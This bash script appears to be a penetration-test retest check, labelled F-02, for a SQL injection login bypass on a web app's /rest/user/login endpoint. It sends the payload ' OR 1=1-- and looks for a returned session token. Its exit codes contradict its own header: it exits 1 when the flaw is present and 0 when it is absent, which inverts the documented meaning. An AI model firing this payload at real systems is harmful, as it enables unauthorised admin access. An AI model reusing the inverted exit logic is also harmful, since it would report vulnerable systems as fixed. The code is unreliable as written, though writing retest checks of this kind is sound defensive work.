#!/bin/bash
# F-02 — SQL injection authentication bypass (admin login without password)
# Exit 0 = finding present · 1 = absent/fixed · 2 = rig error
# Safety: one POST with a login-bypass payload; no valid credentials used. ROE 2026-10-27.
set -u
BASE="${BASE:-http://127.0.0.1:3000}"
UA="Forefront-Retest/1.0 (ROE 2026-10-27)"

code=$(curl -sS --max-time 15 -A "$UA" -o /dev/null -w '%{http_code}' "$BASE/") \
  || { echo "RIG ERROR: liveness GET / failed"; exit 2; }
case "$code" in 2*|3*) ;; *) echo "RIG ERROR: liveness HTTP $code"; exit 2 ;; esac

resp=$(curl -sS --max-time 15 -A "$UA" -X POST "$BASE/rest/user/login" \
  -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}') \
  || { echo "RIG ERROR: login request failed"; exit 2; }

# A bypass returns an authentication token (admin session). A fix returns 401 / no token.
if printf '%s' "$resp" | grep -q '"token"'; then
  echo "PRESENT: login bypass returned a session token"
  exit 1
fi
echo "ABSENT: no token returned (bypass rejected)"
exit 0
